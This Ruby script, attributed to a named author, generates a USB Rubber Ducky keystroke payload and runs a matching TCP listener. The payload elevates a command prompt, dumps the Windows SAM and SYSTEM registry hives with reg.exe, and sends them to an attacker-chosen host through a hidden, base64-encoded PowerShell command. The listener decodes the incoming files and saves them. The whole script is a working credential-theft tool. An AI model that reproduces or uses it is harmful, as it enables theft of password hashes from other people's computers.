#!/usr/bin/env ruby
# Written by James Cook @b00stfr3ak44
require 'socket'
require 'base64'
def print_error(text)
  print "\e[31m[-]\e[0m #{text}"
end
def print_success(text)
  print "\e[32m[+]\e[0m #{text}"
end
def print_info(text)
  print "\e[34m[*]\e[0m #{text}"
end
def get_input(text)
  print "\e[33m[!]\e[0m #{text}"
end
def get_host()
  host_name = [(get_input("Enter the host ip to listen on: ") ), $stdin.gets.rstrip][1]
  ip = host_name.split('.')
  if ip[0] == nil or ip[1] == nil or ip[2] == nil or ip[3] == nil
    print_error("Not a valid IP\n") 
    get_host()
  end
    print_success("Using #{host_name} as server\n")
    return host_name
end
def get_port()
  port = [(get_input("Enter the port you would like to use or leave blank for [443]: ") ), $stdin.gets.rstrip][1]
  if port == ''
    port = '443'
    print_success("Using #{port}\n")
    return port
  elsif not (1..65535).cover?(port.to_i)
    print_error("Not a valid port\n")
    sleep(1)
    port()
  else 
    print_success("Using #{port}\n")
    return port
  end
end
def ducky_setup(host,port)
  save_sam = 'reg.exe save HKLM\SAM c:\windows\temp\sam'
  save_sys = 'reg.exe save HKLM\SYSTEM c:\windows\temp\sys'
  sam = 'c:\windows\temp\sam'
  sys = 'c:\windows\temp\sys'
  powershell_command = %($sam_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{sam}"));$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$writer.WriteLine("sam");$writer.flush();$writer.WriteLine($sam_file);$socket.close();$socket = New-Object net.sockets.tcpclient('#{host}',#{port.to_i});$sys_file=[System.Convert]::ToBase64String([io.file]::ReadAllBytes("#{sys}"));$stream = $socket.GetStream();$writer = new-object  System.IO.StreamWriter($stream);$writer.WriteLine("sys");$writer.flush();$writer.WriteLine($sys_file);$socket.close())
  encoded_command = Base64.encode64(powershell_command.encode("utf-16le")).delete("\r\n")
  File.open("hashdump_tcp.txt","w") {|f| f.write("DELAY 2000\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 3000\nALT y\nDELAY 500\nSTRING #{save_sam}\nENTER\nSTRING #{save_sys}\nENTER\nSTRING powershell -nop -wind hidden -noni -enc \nSTRING #{encoded_command}\nENTER")}
end
def server(port)
  print_info("Starting Server!\n")
  server = TCPServer.open(port.to_i)
  x = 0
  loop{  
    Thread.start(server.accept) do |client|  
      file_name = client.recv(1024)
      print_success("Got #{file_name.strip} file!\n")
      out_put = client.gets()
      File.open("#{file_name.strip}#{x}","w") {|f| f.write(Base64.decode64(out_put))}
      x += 1 if file_name == "sys\r\n"
    end
  }
  rescue => error
    print_error(error)
end
begin
  host = get_host()
  port = get_port()
  ducky_setup(host,port)
  start_listener = [(get_input("Would you like to set up the server now?[yes/no] ") ), $stdin.gets.rstrip][1]
  if start_listener == 'yes'
    server(port)
  end
end
